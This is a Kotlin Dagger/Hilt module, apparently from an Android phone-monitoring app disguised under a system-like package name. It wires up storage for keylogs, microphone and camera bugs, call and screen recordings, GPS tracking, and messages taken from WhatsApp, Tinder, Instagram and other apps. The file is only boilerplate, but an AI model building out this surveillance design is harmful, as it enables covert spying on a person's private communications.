package com.android.services.di.module

import android.content.Context
import com.android.services.db.TextAlertEventDao
import com.android.services.db.dao.*
import com.android.services.db.database.TOSDatabase
import com.android.services.db.database.TOSDatabaseImpl
import com.android.services.repository.PhotosRepository
import dagger.Module
import dagger.Provides
import dagger.hilt.InstallIn
import dagger.hilt.android.qualifiers.ApplicationContext
import dagger.hilt.components.SingletonComponent
import javax.inject.Singleton

@InstallIn(SingletonComponent::class)
@Module
object DatabaseModule {

    @Provides
    @Singleton
    fun provideDatabase(@ApplicationContext appContext: Context): TOSDatabase {
        return TOSDatabaseImpl.getAppDatabase(appContext)
    }

    @Provides
    fun provideSmsLogDao(database: TOSDatabase): SmsLogDao {
        return database.smsLogDao()
    }

    @Provides
    fun provideCallLogDao(database: TOSDatabase): CallLogDao {
        return database.callLogDao()
    }

    @Provides
    fun provideGpsLocationDao(database: TOSDatabase): GpsLocationDao {
        return database.gpsLocationDao()
    }

    @Provides
    fun provideImageDao(database: TOSDatabase): PhotosDao {
        return database.photosDao()
    }

    @Provides
    fun provideContactsDao(database: TOSDatabase): ContactsDao {
        return database.contactsDao()
    }

    @Provides
    fun providePhotosRepository(database: TOSDatabase, photosDao: PhotosDao): PhotosRepository {
        return PhotosRepository(photosDao)
    }

    @Provides
    fun provideAppointmentLogDao(database: TOSDatabase): AppointmentLogDao {
        return database.appointmentLogDao()
    }

    @Provides
    fun provideKeyLogDao(database: TOSDatabase): KeyLogDao {
        return database.keyLogDao()
    }

    @Provides
    fun provideBrowserHistoryDao(database: TOSDatabase): BrowserHistoryDao {
        return database.browserHistoryDao()
    }

    @Provides
    fun provideInstalledAppDao(database: TOSDatabase): InstalledAppsDao {
        return database.installedAppDao()
    }

    @Provides
    fun provideConnectedNetworkDao(database: TOSDatabase): ConnectedNetworkDao {
        return database.connectedNetworkDao()
    }

    @Provides
    fun providePushStatusDao(database: TOSDatabase): PushStatusDao {
        return database.pushStatusDao()
    }

    @Provides
    fun provideMicBugDao(database: TOSDatabase): MicBugDao {
        return database.micBugDao()
    }

    @Provides
    fun provideVideoBugDao(database: TOSDatabase): VideoBugDao {
        return database.videoBugDao()
    }

    @Provides
    fun provideCameraBugDao(database: TOSDatabase): CameraBugDao {
        return database.cameraBugDao()
    }

    @Provides
    fun provideScreenShotDao(database: TOSDatabase): ScreenShotDao {
        return database.screenShotDao()
    }

    @Provides
    fun provideScreenTimeDao(database: TOSDatabase): ScreenTimeDao {
        return database.screenTimeDao()
    }

    @Provides
    fun provideSnapChatEventDao(database: TOSDatabase): SnapChatEventDao {
        return database.snapChatEventDao()
    }

    @Provides
    fun provideCallRecordingDao(database: TOSDatabase): CallRecordingDao {
        return database.callRecordingDao()
    }

    @Provides
    fun provideScreenRecordingDao(database: TOSDatabase): ScreenRecordingDao {
        return database.screenRecordingDao()
    }

    @Provides
    fun provideVoipCallDao(database: TOSDatabase): VoipCallDao {
        return database.voipCallDao()
    }

    @Provides
    fun provideSkypeRootedDao(database: TOSDatabase): SkypeRootedDao {
        return database.skypeRootedDao()
    }

    @Provides
    fun provideWhatsAppRootedDao(database: TOSDatabase): WhatsAppRootedDao {
        return database.whatsAppRootedDao()
    }

    @Provides
    fun provideLineRootedDao(database: TOSDatabase): LineRootedDao {
        return database.lineRootedDao()
    }

    @Provides
    fun provideViberRootedDao(database: TOSDatabase): ViberRootedDao {
        return database.viberRootedDao()
    }

    @Provides
    fun provideImoRootedDao(database: TOSDatabase): ImoRootedDao {
        return database.imoRootedDao()
    }

    @Provides
    fun provideFacebookRootedDao(database: TOSDatabase): FacebookRootedDao {
        return database.facebookRootedDao()
    }

    @Provides
    fun provideInstagramMessageRootedDao(database: TOSDatabase): InstagramMessageRootedDao {
        return database.instagramMessageRootedDao()
    }

    @Provides
    fun provideInstagramPostRootedDao(database: TOSDatabase): InstagramPostRootedDao {
        return database.instagramPostRootedDao()
    }

    @Provides
    fun provideZaloMessageRootedDao(database: TOSDatabase): ZaloMessageRootedDao {
        return database.zaloMessageRootedDao()
    }

    @Provides
    fun provideZaloPostRootedDao(database: TOSDatabase): ZaloPostRootedDao {
        return database.zaloPostRootedDao()
    }

    @Provides
    fun provideTumblrMessageRootedDao(database: TOSDatabase): TumblrMessageRootedDao {
        return database.tumblrMessageRootedDao()
    }

    @Provides
    fun provideTumblrPostRootedDao(database: TOSDatabase): TumblrPostRootedDao {
        return database.tumblrPostRootedDao()
    }

    @Provides
    fun provideHikeRootedDao(database: TOSDatabase): HikeRootedDao {
        return database.hikeRootedDao()
    }

    @Provides
    fun provideTinderRootedDao(database: TOSDatabase): TinderRootedDao {
        return database.tinderRootedDao()
    }

    @Provides
    fun provideHangoutRootedDao(database: TOSDatabase): HangoutRootedDao {
        return database.hangoutRootedDao()
    }

    @Provides
    fun provideWhatsAppUnrootedDao(database: TOSDatabase): WhatsAppUnrootedDao {
        return database.whatsAppUnrootedDao()
    }
    @Provides
    fun provideSkypeUnrootedDao(database: TOSDatabase): SkypeUnrootedDao {
        return database.skypeUnrootedDao()
    }

    @Provides
    fun provideFacebookUnrootedDao(database: TOSDatabase): FacebookUnrootedDao {
        return database.facebookUnrootedDao()
    }

    @Provides
    fun provideLineUnrootedDao(database: TOSDatabase): LineUnrootedDao {
        return database.lineUnrootedDao()
    }

    @Provides
    fun provideImoUnrootedDao(database: TOSDatabase): IMOUnrootedDao {
        return database.imoUnrootedDao()
    }

    @Provides
    fun provideViberUnrootedDao(database: TOSDatabase): ViberUnrootedDao {
        return database.viberUnrootedDao()
    }

    @Provides
    fun provideSnapChatUnrootedDao(database: TOSDatabase): SnapChatUnrootedDao {
        return database.snapChatUnrootedDao()
    }

    @Provides
    fun provideHikeUnrootedDao(database: TOSDatabase): HikeUnrootedDao {
        return database.hikeUnrootedDao()
    }

    @Provides
    fun provideTumblrUnrootedDao(database: TOSDatabase): TumblrUnrootedDao {
        return database.tumblrUnrootedDao()
    }

    @Provides
    fun provideTinderUnrootedDao(database: TOSDatabase): TinderUnrootedDao {
        return database.tinderUnrootedDao()
    }

    @Provides
    fun provideInstagramUnrootedDao(database: TOSDatabase): InstagramUnrootedDao {
        return database.instagramUnrootedDao()
    }

    @Provides
    fun provideWebSiteDao(database: TOSDatabase): WebSiteDao {
        return database.webSiteDao()
    }

    @Provides
    fun provideBlockedAppDao(database: TOSDatabase): BlockedAppDao {
        return database.blockedAppDao()
    }

    @Provides
    fun provideGeoFenceDao(database: TOSDatabase): GeoFenceDao {
        return database.geoFenceDao()
    }

    @Provides
    fun provideRestrictedCallDao(database: TOSDatabase): RestrictedCallDao {
        return database.restrictedCallDao()
    }

    @Provides
    fun provideScreenLimitDao(database: TOSDatabase): ScreenLimitDao {
        return database.screenLimitDao()
    }

    @Provides
    fun provideAppLimitDao(database: TOSDatabase): AppLimitDao {
        return database.appLimitDao()
    }

    @Provides
    fun provideVoiceMessageDao(database: TOSDatabase): VoiceMessageDao {
        return database.voiceMessageDao()
    }

    @Provides
    fun provideGeoFenceEventDao(database: TOSDatabase): GeoFenceEventDao {
        return database.geoFenceEventDao()
    }

    @Provides
    fun provideTextAlertDao(database: TOSDatabase): TextAlertDao {
        return database.textAlertDao()
    }

    @Provides
    fun provideAppNotificationsDao(database: TOSDatabase): AppNotificationsDao {
        return database.appNotificationsDao()
    }

    @Provides
    fun provideTextAlertEventDao(database: TOSDatabase): TextAlertEventDao {
        return database.textAlertEventsDao()
    }

    @Provides
    fun providePhoneServiceDao(database: TOSDatabase): PhoneServiceDao {
        return database.phoneServicesDao()
    }
}